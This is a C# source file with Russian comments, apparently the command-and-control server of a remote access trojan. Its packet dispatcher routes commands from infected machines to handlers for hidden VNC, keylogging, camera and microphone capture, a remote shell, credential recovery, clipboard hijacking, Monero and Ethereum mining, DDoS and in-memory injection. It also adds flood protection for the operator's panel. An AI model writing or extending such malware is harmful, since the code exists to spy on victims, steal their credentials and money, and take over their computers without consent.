// --- НАЧАЛО ФАЙЛА Packet.cs ---

using System;
using System.Drawing;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class Packet
{
    public void Read(Clients client, byte[] data)
    {
        try
        {
            object[] array = LEB128.Read(data);
            string command = (string)array[0];

            // --- ЛОГИКА ЗАЩИТЫ ОТ ФЛУДА ---
            // Проверяем, является ли это пакетом "Connect"
            if (command == "Connect")
            {
                // Если клиент УЖЕ завершил рукопожатие, это атака.
                if (client.HasCompletedHandshake)
                {
                    Methods.AppendLogs(client.IP, "Обнаружен повторный пакет 'Connect' (флуд). Клиент заблокирован.", Color.Red);
                    client.Disconnect();
                    return; // Немедленно выходим, не обрабатывая пакет
                }
            }
            // --- КОНЕЦ ЛОГИКИ ЗАЩИТЫ ---

            switch (command)
            {
                case "Connect":
                    HandlerConnect.Read(client, array);
                    break;
                case "Ping":
                    HandlerPing.Read(client, array);
                    break;
                case "Pong":
                    HandlerPong.Read(client, array);
                    break;
                case "Error":
                    HandlerError.Read(client, array);
                    break;
                case "SendFileDisk":
                    Methods.AppendLogs(client.IP, "Succues File: " + (string)array[1], Color.Green);
                    break;
                case "WormLog":
                    Methods.AppendLogs(client.IP, (string)array[1], Color.DarkBlue);
                    break;
                case "WormLog1":
                    Methods.AppendLogs(client.IP, (string)array[1], Color.DarkOrange);
                    break;
                case "WormLog2":
                    Methods.AppendLogs(client.IP, (string)array[1], Color.DarkSeaGreen);
                    break;
                case "SendFileMemory":
                    Methods.AppendLogs(client.IP, "Succues Inject: " + (string)array[1], Color.Green);
                    break;
                case "Update":
                    Methods.AppendLogs(client.IP, "Succues Update: " + (string)array[1], Color.Green);
                    break;
                case "Uninstall":
                    Methods.AppendLogs(client.IP, "Succues Uninstall: " + (string)array[1], Color.Green);
                    break;
                case "Report":
                    Methods.AppendLogs(client.IP, "Window Report " + client.Hwid + ": " + (string)array[1], Color.Purple);
                    break;
                case "ReportWindow":
                    HandlerReportWindow.Read(client, array);
                    break;
                case "GetDLL":
                    HandlerGetDLL.Read(client, array);
                    break;
                case "Desktop":
                    HandlerDesktop.Read(client, array);
                    break;
                case "Camera":
                    HandlerCamera.Read(client, array);
                    break;
                case "Microphone":
                    HandlerMicrophone.Read(client, array);
                    break;
                case "SystemSound":
                    HandlerSystemSound.Read(client, array);
                    break;
                case "Explorer":
                    HandlerExplorer.Read(client, array);
                    break;
                case "HVNC":
                    HandlerHVNC.Read(client, array);
                    break;
                case "Process":
                    HandlerProcess.Read(client, array);
                    break;
                case "Regedit":
                    HandlerRegedit.Read(client, array);
                    break;
                case "Shell":
                    HandlerShell.Read(client, array);
                    break;
                case "Netstat":
                    HandlerNetstat.Read(client, array);
                    break;
                case "KeyLogger":
                    HandlerKeyLogger.Read(client, array);
                    break;
                case "AutoRun":
                    HandlerAutoRun.Read(client, array);
                    break;
                case "Service":
                    HandlerService.Read(client, array);
                    break;
                case "Fun":
                    HandlerFun.Read(client, array);
                    break;
                case "Chat":
                    HandlerChat.Read(client, array);
                    break;
                case "ReverseProxy":
                    HandlerReverseProxy.Read(client, array);
                    break;
                case "ReverseProxyR":
                    HandlerReverseProxyR.Read(client, array);
                    break;
                case "ReverseProxyU":
                    HandlerReverseProxyU.Read(client, array);
                    break;
                case "Recovery":
                    HandlerRecovery.Read(client, array);
                    break;
                case "Recovery1":
                    HandlerRecovery1.Read(client, array);
                    break;
                case "MinerXmr":
                    HandlerMinerXmr.Read(client, array);
                    break;
                case "DDos":
                    HandlerDDos.Read(client, array);
                    break;
                case "Clipper":
                    HandlerClipper.Read(client, array);
                    break;
                case "Window":
                    HandlerWindow.Read(client, array);
                    break;
                case "KeyLoggerPanel":
                    HandlerKeyLoggerPanel.Read(client, array);
                    break;
                case "Programs":
                    HandlerPrograms.Read(client, array);
                    break;
                case "Clipboard":
                    HandlerClipboard.Read(client, array);
                    break;
                case "BotSpeaker":
                    HandlerBotSpeaker.Read(client, array);
                    break;
                case "HostsFile":
                    HandlerHostsFile.Read(client, array);
                    break;
                case "Notepad":
                    HandlerNotepad.Read(client, array);
                    break;
                case "Volume":
                    HandlerVolume.Read(client, array);
                    break;
                case "DeviceManager":
                    HandlerDeviceManager.Read(client, array);
                    break;
                case "Performance":
                    HandlerPerformance.Read(client, array);
                    break;
                case "FileSearcher":
                    HandlerFileSearcher.Read(client, array);
                    break;
                case "MinerEtc":
                    HandlerMinerEtc.Read(client, array);
                    break;
                case "SendDiskGet":
                    HandlerSendDiskGet.Read(client, array);
                    break;
                case "SendMemoryGet":
                    HandlerSendMemoryGet.Read(client, array);
                    break;
                case "Map":
                    HandlerMap.Read(client, array);
                    break;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.ToString());
        }
    }
}
// --- КОНЕЦ ФАЙЛА Packet.cs ---